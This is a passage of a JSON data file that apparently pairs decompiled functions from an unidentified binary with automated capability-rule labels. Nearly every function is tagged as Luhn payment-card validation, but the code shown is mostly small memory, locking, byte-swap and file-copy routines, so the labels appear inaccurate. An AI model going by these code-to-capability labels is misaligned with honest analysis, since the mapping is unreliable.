        "decompiled_code": "\nulong fcn.0001a9b0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    bool bVar4;\n    ulong auStack56 [3];\n    \n    LOCK();\n    bVar4 = *0x7e250 == 0;\n    *0x7e250 = *0x7e250 ^ bVar4 * *0x7e250;\n    if ((bVar4) && (iVar1 = (*_fcn.00011220)(auStack56, 0x1f03ff, 0, 0, 0, 0x1a880, 0),  iVar1 == 0)) {\n        fcn.000667be(auStack56[0], 0, 0);\n        fcn.000666f2(auStack56[0]);\n    }\n    puVar3 = fcn.00030c98(0x10);\n    if (puVar3 != NULL) {\n        *puVar3 = arg2;\n        puVar3[1] = arg3;\n        iVar1 = (*_fcn.00011220)(arg1, 0x1f03ff, 0, 0, 0, 0x1a8f4, puVar3);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    uVar2 = fcn.00066782();\n    fcn.00030e10(uVar2);\n    return 0xffffffff;\n}\n",
        "token_count": 344
    },
    "0001abd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0001abd4(int64_t arg1, ulong arg2)\n\n{\n    bool bVar1;\n    \n    LOCK();\n    *0x7e260 = *0x7e260 + 1;\n    do {\n        LOCK();\n        bVar1 = *0x7e268 == 0;\n        *0x7e268 = *0x7e268 ^ bVar1 * *0x7e268;\n    } while (!bVar1);\n    if (arg1 != 0) {\n        fcn.00030d24(arg1);\n    }\n    (*_fcn.000111f0)(arg2);\n    return 0;\n}\n",
        "token_count": 145
    },
    "0001ac80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001ac80(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    if ((arg1 == 0) || (arg2 == 0)) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        (**0x11130)(arg2);\n        (*_fcn.00011128)(arg2);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 103
    },
    "0001ad2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001ad2c(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    \n    if ((arg1 == 0) || (arg2 == 0)) {\n        uVar1 = 0xc0000005;\n    }\n    else {\n        (**0x11238)();\n        uVar1 = fcn.0001ac80(arg1, arg2);\n    }\n    return uVar1;\n}\n",
        "token_count": 99
    },
    "0001b4bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001b4bc(ulong arg1, ulong arg2)\n\n{\n    fcn.0001a5bc(arg1, arg2, 0, 0x1a590);\n    return;\n}\n",
        "token_count": 49
    },
    "0001bd14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0001bd14(ulong arg1)\n\n{\n    int16_t iVar1;\n    char16_t cVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int16_t *piVar5;\n    char16_t *pcVar6;\n    bool bVar7;\n    \n    if (*0x7e538 == 0) {\n        fcn.00029134(0x7e450, 0x52);\n        uVar4 = 0xffffffffffffffff;\n        piVar5 = 0x7e450;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n        } while (iVar1 != 0);\n        *0x7e538 = ~uVar4 - 1;\n        fcn.00066722(L\"LEGACY_Ultra3\", 0x52, 0x11b30, 0x7e450);\n        uVar4 = 0xffffffffffffffff;\n        pcVar6 = L\"LEGACY_Ultra3\";\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar2 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar2 != L'\\0');\n        *0x7e4f8 = ~uVar4 - 1;\n    }\n    iVar3 = fcn.0006678e(arg1, 0x7e450, *0x7e538);\n    if (iVar3 == 0) {\n        bVar7 = true;\n    }\n    else {\n        iVar3 = fcn.00031328(arg1, L\"LEGACY_Ultra3\", *0x7e4f8);\n        bVar7 = iVar3 == 0;\n    }\n    return bVar7;\n}\n",
        "token_count": 436
    },
    "0001c758": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0001c758(void)\n\n{\n    int32_t iVar1;\n    \n    fcn.000302c0(0x7e448);\n    fcn.000302c0(0x7e290);\n    *0x7e298 = fcn.00030cec(100);\n    if (*0x7e298 == 0) {\n        iVar1 = -0x3fffff66;\n    }\n    else {\n        iVar1 = fcn.00055cc0(1, *(*0x69080 + 0x10), 0x11be0, 0x1c00c);\n        if (iVar1 == 0) {\n            fcn.00059140();\n            iVar1 = fcn.00055cc0(1, *(*0x69080 + 0x10), 0x11bd0, 0x1c218);\n            if (iVar1 == 0) {\n                fcn.00059140();\n                iVar1 = fcn.00055cc0(1, *(*0x69080 + 0x10), 0x11bc0, 0x1b844);\n                if (iVar1 == 0) {\n                    fcn.00059140();\n                    iVar1 = fcn.00055cc0(1, *(*0x69080 + 0x10), 0x11bb0, 0x1c3d8);\n                    if (iVar1 == 0) {\n                        fcn.00059140(*0x7e520);\n                        *0x7e528 = 1;\n                    }\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 363
    },
    "0001ca70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001ca70(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    \n    if (*0x7e558 == 0) {\n        (**0x11288)(arg1);\n    }\n    else {\n        pcVar1 = fcn.000547bc(*0x7e558);\n        (*pcVar1)(arg1, arg2, arg3);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0001cab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001cab0(ulong arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    \n    if (*0x7e560 == 0) {\n        (**0x11170)(arg1);\n    }\n    else {\n        pcVar1 = fcn.000547bc(*0x7e560);\n        (*pcVar1)(arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0001ccdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001ccdc(void)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.00054a20();\n    if (uVar1 == 0) {\n        fcn.00055b6c(0x11c90, 0x7e558);\n        fcn.00055b6c(0x11c78, 0x7e560);\n        fcn.00055ba4(0x11bc0, 0x7e568);\n        fcn.00055ba4(0x11c68, 0x7e570);\n        fcn.00055ba4(0x11c58, 0x7e578);\n        fcn.00055ba4(0x11c40, 0x7e580);\n        fcn.00054a3c();\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 204
    },
    "0001cd68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0001cd73: Changing call to branch\n// WARNING: Possible PIC construction at 0x0001cd8b: Changing call to branch\n// WARNING: Possible PIC construction at 0x0001cda3: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0001cd90)\n// WARNING: Removing unreachable block (ram,0x0001cd78)\n// WARNING: Removing unreachable block (ram,0x0001cda8)\n\nvoid fcn.0001cd68(void)\n\n{\n    int64_t *arg1;\n    \n    arg1 = *0x7e558;\n    if (*0x7e558 != NULL) {\n        *0x7e558 = NULL;\n        if (arg1[5] != arg1 + 0xe) {\n            fcn.00030d24(arg1[5]);\n        }\n        if (*arg1 != arg1 + 0x8f) {\n            fcn.00030d24(*arg1);\n        }\n        fcn.0006677c(arg1, 0, 0xb0);\n        fcn.00030d24(arg1);\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "000545c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000545c4(int64_t **arg1)\n\n{\n    int64_t *arg1_00;\n    \n    if ((arg1 != NULL) && (arg1_00 = *arg1,  arg1_00 != NULL)) {\n        *arg1 = NULL;\n        if (arg1_00[5] != arg1_00 + 0xe) {\n            fcn.00030d24(arg1_00[5]);\n        }\n        if (*arg1_00 != arg1_00 + 0x8f) {\n            fcn.00030d24(*arg1_00);\n        }\n        fcn.0006677c(arg1_00, 0, 0xb0);\n        fcn.00030d24(arg1_00);\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "0001cdb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001cdb8(void)\n\n{\n    fcn.00016e04(0);\n    fcn.000666f2(*(*0x69080 + 0x28));\n    *(*0x69080 + 0x28) = 0;\n    return 0;\n}\n",
        "token_count": 65
    },
    "0001d15c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001d15c(void)\n\n{\n    int64_t *piVar1;\n    int64_t **arg1;\n    int32_t iVar2;\n    \n    fcn.000649a4(0x7e7d8, 0);\n    arg1 = *0x7e7e0;\n    fcn.00030310(0x8e2e8);\n    iVar2 = fcn.0005cf30(arg1, 3);\n    if ((iVar2 == 0) || (piVar1 = *arg1,  *(piVar1 + 1) != 0)) {\n        fcn.00030378(0x8e2e8);\n    }\n    else {\n        *(piVar1 + 0xc) = 0;\n        *(piVar1 + 1) = 1;\n        fcn.00030378(0x8e2e8);\n        (**(**arg1 + 0x24))(arg1, 0);\n        fcn.00064668(arg1);\n    }\n    *0x7e7e0 = NULL;\n    return;\n}\n",
        "token_count": 246
    },
    "0001e364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0001e364(void)\n\n{\n    (*_fcn.000112c8)();\n    return;\n}\n",
        "token_count": 26
    },
    "0001ea64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001ea64(ulong param_1)\n\n{\n    fcn.0001e8bc(param_1);\n    return 0;\n}\n",
        "token_count": 35
    },
    "0002036c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002036c(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t in_stack_00000028;\n    \n    while( true ) {\n        if (arg1 == NULL) {\n            return 0;\n        }\n        if (*(arg1 + 1) == arg2) break;\n        arg1 = *arg1;\n    }\n    if (*(arg1 + 0xc) != arg3) {\n        return 0;\n    }\n    if (*(arg1 + 2) != in_stack_00000028) {\n        return 0;\n    }\n    fcn.0006670a(arg4, arg1[3], *(arg1 + 2));\n    return 1;\n}\n",
        "token_count": 163
    },
    "00020648": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint32_t fcn.00020648(char *arg1)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    \n    uVar4 = 0;\n    uVar6 = 0;\n    if ((arg1 == NULL) || (*arg1 == '\\0')) {\n        uVar6 = 0;\n    }\n    else {\n        uVar2 = 0xffffffffffffffff;\n        pcVar5 = arg1;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        uVar2 = uVar4;\n        if (uVar3 != 0) {\n            do {\n                pcVar5 = arg1 + uVar4;\n                uVar4 = uVar4 + 1;\n                uVar6 = uVar2 << 3 ^ *pcVar5;\n                uVar2 = uVar6;\n            } while (uVar4 < uVar3);\n        }\n        uVar6 = uVar6 ^ uVar3 + 1;\n        if (uVar6 == 0) {\n            uVar6 = 0xffffffff;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 333
    },
    "0002072c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0002072c(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint *puVar1;\n    \n    puVar1 = fcn.00030c98(0x28);\n    if (puVar1 != NULL) {\n        *puVar1 = arg2;\n        puVar1[1] = arg3;\n        puVar1[2] = arg4;\n        puVar1[3] = arg4;\n        *(puVar1 + 4) = 0;\n        *(puVar1 + 6) = 0;\n        *(puVar1 + 8) = *(arg1 + 0x38);\n        *(arg1 + 0x38) = puVar1;\n    }\n    return puVar1;\n}\n",
        "token_count": 175
    },
    "00021fd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00021fd4(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int64_t iStackX32;\n    uchar auStack40 [24];\n    \n    uVar1 = fcn.00020f54(&iStackX32, arg1, 0, auStack40);\n    if (uVar1 == 0) {\n        *(iStackX32 + 0x94) = arg2;\n        *(iStackX32 + 0x98) = arg3;\n        *(iStackX32 + 0x90) = 1;\n        fcn.000207cc(auStack40);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 163
    },
    "00022028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00022028(uint32_t *arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if ((arg1 != NULL) && (arg2 != 0)) {\n        iVar3 = *(arg2 + 0x2c) + 0x40;\n        uVar2 = arg1[7] + iVar3;\n        if (arg1[2] <= uVar2 && uVar2 != arg1[2]) {\n            uVar4 = arg1[3];\n            if (uVar4 < uVar2) {\n                uVar4 = (((arg1[5] - uVar4) + -1 + uVar2) / arg1[5]) * arg1[5] + uVar4;\n            }\n            if (arg1[4] <= uVar4) {\n                fcn.000211a0(*arg1);\n                uVar4 = arg1[3];\n                if (uVar4 < iVar3 + arg1[7]) {\n                    uVar4 = (((arg1[5] - uVar4) + -1 + iVar3 + arg1[7]) / arg1[5]) * arg1[5] + uVar4;\n                }\n                if (arg1[4] <= uVar4) {\n                    return 0xffffffff;\n                }\n            }\n            iVar1 = fcn.00020c94(arg1, uVar4);\n            if (iVar1 != 0) {\n                fcn.000211a0(*arg1);\n                iVar1 = fcn.00020c94(arg1, uVar4);\n                if (iVar1 != 0) {\n                    return 0xffffffff;\n                }\n            }\n        }\n        uVar2 = arg1[7];\n        iVar1 = (**(*(arg1 + 0x16) + 0x30))(*(arg1 + 0x18), arg2, 0x40, uVar2);\n        if (iVar1 == 0) {\n            arg1[7] = arg1[7] + iVar3;\n            arg1[6] = arg1[6] + 1;\n            arg1[0xb] = arg1[0xb] + 1;\n            iVar3 = (**(*(arg1 + 0x16) + 0x30))(*(arg1 + 0x18), arg1 + 2, 0x2c, 0);\n            if (iVar3 != 0) {\n                return 0xffffffff;\n            }\n            return uVar2;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 587
    },
    "00022ffc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00022ffc(ulong arg1, ulong arg2)\n\n{\n    int64_t arg4;\n    int64_t arg4_00;\n    int64_t iVar1;\n    int64_t arg3;\n    uchar auStack2088 [2048];\n    \n    arg4 = fcn.00031698(arg1, 0x11f08);\n    if (arg4 != 0) {\n        arg4_00 = fcn.00031698(arg2, 0x11f04);\n        if (arg4_00 == 0) {\n            fcn.00030f2c(arg4);\n        }\n        else {\n            do {\n                arg3 = fcn.00030fb8(auStack2088, 1, 0x800, arg4);\n                if (arg3 == 0) {\n                    fcn.00030f2c(arg4);\n                    fcn.00030f2c(arg4_00);\n                    return 0;\n                }\n                iVar1 = fcn.00030f3c(auStack2088, 1, arg3, arg4_00);\n            } while (iVar1 == arg3);\n            fcn.00030f2c(arg4);\n            fcn.00030f2c(arg4_00);\n            fcn.00031afc(arg2);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 300
    },
    "000236b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000236b0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t *piVar6;\n    uchar auStackX8 [32];\n    uchar auStack536 [256];\n    uchar auStack280 [256];\n    \n    uVar1 = fcn.0002748c(100, 0);\n    if (uVar1 != 0) {\n        uVar4 = 0x70;\n        piVar6 = 0x7ebc0;\n        uVar5 = uVar1;\n        do {\n            iVar2 = fcn.00027418(uVar4 - 0xb, auStack280, 0x100, auStackX8);\n            if (iVar2 == 0) {\n                auStack536[0] = 0;\n                fcn.00027418(uVar4, auStack536, 0x100, auStackX8);\n                iVar3 = fcn.00023260(auStack280, auStack536);\n                *piVar6 = iVar3;\n                if (iVar3 != 0) {\n                    piVar6 = piVar6 + 1;\n                }\n            }\n            uVar4 = uVar4 + 1;\n            uVar5 = uVar5 - 1;\n        } while (uVar5 != 0);\n    }\n    fcn.000448bc();\n    fcn.00035378();\n    fcn.000182c0();\n    fcn.00035138();\n    return;\n}\n",
        "token_count": 355
    },
    "000250dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.000250dc(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t *puVar3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.00030dc8(*arg1);\n    *arg1 = uVar1;\n    uVar1 = fcn.00030dc8(arg1[1]);\n    arg1[1] = uVar1;\n    uVar1 = fcn.00030dc8(arg1[2]);\n    arg1[2] = uVar1;\n    uVar2 = fcn.00030dc8(*(arg1 + 0xd));\n    *(arg1 + 0xd) = uVar2;\n    uVar2 = fcn.00030dc8(*(arg1 + 0x11));\n    *(arg1 + 0x11) = uVar2;\n    uVar2 = fcn.00030dc8(*(arg1 + 0x15));\n    *(arg1 + 0x15) = uVar2;\n    uVar2 = fcn.00030dc8(*(arg1 + 0x19));\n    *(arg1 + 0x19) = uVar2;\n    uVar2 = fcn.00030dc8(*(arg1 + 0x1d));\n    puVar3 = arg1 + 0x21;\n    *(arg1 + 0x1d) = uVar2;\n    iVar4 = 4;\n    do {\n        uVar1 = fcn.00030dc8(*puVar3);\n        *puVar3 = uVar1;\n        puVar3 = puVar3 + 1;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    return;\n}\n",
        "token_count": 394
    },
    "00025160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00025160(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int64_t iVar3;\n    \n    uVar1 = fcn.00030dc8(*arg1);\n    *arg1 = uVar1;\n    uVar1 = fcn.00030dc8(arg1[1]);\n    arg1[1] = uVar1;\n    uVar1 = fcn.00030dc8(arg1[2]);\n    arg1[2] = uVar1;\n    uVar1 = fcn.00030dc8(arg1[3]);\n    arg1[3] = uVar1;\n    uVar1 = fcn.00030dc8(arg1[8]);\n    arg1[8] = uVar1;\n    uVar1 = fcn.00030dc8(arg1[9]);\n    arg1[9] = uVar1;\n    uVar1 = fcn.00030dc8(arg1[10]);\n    arg1[10] = uVar1;\n    uVar1 = fcn.00030dc8(arg1[0xb]);\n    arg1[0xb] = uVar1;\n    uVar1 = fcn.00030dc8(arg1[0xc]);\n    puVar2 = arg1 + 4;\n    arg1[0xc] = uVar1;\n    iVar3 = 4;\n    do {\n        uVar1 = fcn.00030dc8(*puVar2);\n        *puVar2 = uVar1;\n        puVar2 = puVar2 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 378
    },
    "000302e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000302e8(int64_t *arg1)\n\n{\n    if ((arg1 != NULL) && (*arg1 != 0)) {\n        fcn.00030d24(*arg1);\n        *arg1 = 0;\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00025528": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00025528(ulong noname_0, ulong arg2)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int64_t iVar3;\n    \n    iVar3 = 0;\n    piVar2 = 0x693b0;\n    do {\n        if (*piVar2 == arg2) {\n            uVar1 = (**(iVar3 * 0x10 + 0x693b8))();\n            return uVar1;\n        }\n        iVar3 = iVar3 + 1;\n        piVar2 = piVar2 + 4;\n    } while (iVar3 < 0x1c);\n    return 0x21590001;\n}\n",
        "token_count": 152
    },
    "00025588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00025588(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uStack24;\n    \n    iVar1 = fcn.000226e8(0xffffffff, 1, arg1, arg3);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00032734(0x8e768);\n        if (iVar1 != 0) {\n            fcn.0002fcb8(0x8e768);\n        }\n        uStack24 = 0;\n    }\n    else {\n        uStack24 = iVar1 + 0x191U | 0x21590000;\n        iVar1 = fcn.000226e8(0xffffffff, 1, arg1, 0);\n        if (iVar1 != 0) {\n            uStack24 = iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return uStack24;\n}\n",
        "token_count": 223
    },
    "00025634": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00025634(ulong arg1, ulong arg2, ulong *arg3, uint *arg4)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    ulong *puVar3;\n    \n    puVar3 = fcn.000645b0(arg2);\n    if (puVar3 == NULL) {\n        *arg3 = 0;\n        *arg4 = 0;\n    }\n    else {\n        *puVar3 = 0;\n        puVar3[1] = 0;\n        *(puVar3 + 2) = 0;\n        uVar1 = fcn.0002748c(1, 0);\n        *(puVar3 + 4) = arg1;\n        *puVar3 = uVar1;\n        uVar2 = fcn.00030dc8(uVar1);\n        *puVar3 = uVar2;\n        uVar2 = fcn.00030dc8(*(puVar3 + 4));\n        *(puVar3 + 4) = uVar2;\n        *arg3 = puVar3;\n        *arg4 = 0x14;\n    }\n    fcn.00027a4c(6, arg1, 0, 0);\n    return 0x215901f4;\n}\n",
        "token_count": 283
    },
    "00026308": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00026308(void)\n\n{\n    fcn.000302c0(0x7ec40);\n    *0x7ec48 = fcn.00030cec(0x1a8);\n    if (*0x7ec48 != 0) {\n        fcn.0002fc18(0x7ec38);\n        fcn.0001a9b0(0x7ec50, 0x25dd4, 0);\n        if (*0x8ea38 == NULL) {\n            *0x8ea38 = fcn.00025528;\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00026fb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00026fb4(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    uint auStackX24 [4];\n    uchar auStack72 [4];\n    uint32_t uStack68;\n    int32_t iStack24;\n    \n    auStackX24[0] = arg3;\n    uVar1 = fcn.00022168(0xfffffffe, 2, auStackX24, auStack72);\n    if (uVar1 == 0) {\n        if (iStack24 == arg2) {\n            uVar1 = fcn.0002220c(0xfffffffe, 2, uStack68, 0);\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 177
    },
    "00027030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00027030(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    uint auStackX24 [4];\n    uchar auStack72 [4];\n    uint32_t uStack68;\n    int32_t iStack24;\n    \n    auStackX24[0] = 0x229;\n    uVar1 = fcn.00022168(0xfffffffd, 2, auStackX24, auStack72);\n    if (uVar1 == 0) {\n        if (iStack24 == arg2) {\n            uVar1 = fcn.0002220c(0xfffffffd, 2, uStack68, 0);\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 174
    },
    "00027418": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00027418(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.000270f4(2, arg1, arg2, arg3);\n    if (((iVar1 == 0) && (arg2 != 0)) && (arg3 != 0)) {\n        *((arg3 - 1) + arg2) = 0;\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00027460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00027460(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.000272c0(2, arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 46
    },
    "0002748c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0002748c(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    uchar auStackX24 [8];\n    uchar auStackX32 [8];\n    uchar auStack120 [112];\n    \n    uVar2 = arg2;\n    iVar1 = fcn.00027418(arg1, auStack120, 100, auStackX24);\n    if (iVar1 == 0) {\n        uVar2 = fcn.00031248(auStack120, auStackX32, 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 139
    },
    "000274d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000274d4(ulong arg1, ulong arg2)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    char acStack136 [120];\n    \n    fcn.00066836(acStack136, 0x11f1c);\n    iVar2 = -1;\n    pcVar3 = acStack136;\n    do {\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00027460(arg1, acStack136, ~iVar2);\n    return;\n}\n",
        "token_count": 162
    },
    "00027818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00027818(int64_t arg1, uint *arg2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0004d360(*(arg1 + 8));\n    *arg2 = uVar1;\n    return 0;\n}\n",
        "token_count": 61
    },
    "00027870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00027870(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    *(arg1 + 0x134) = 0;\n    *(arg1 + 0x130) = 1;\n    fcn.00050910(0, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 78
    },
    "0002792c": {
        "rules": [
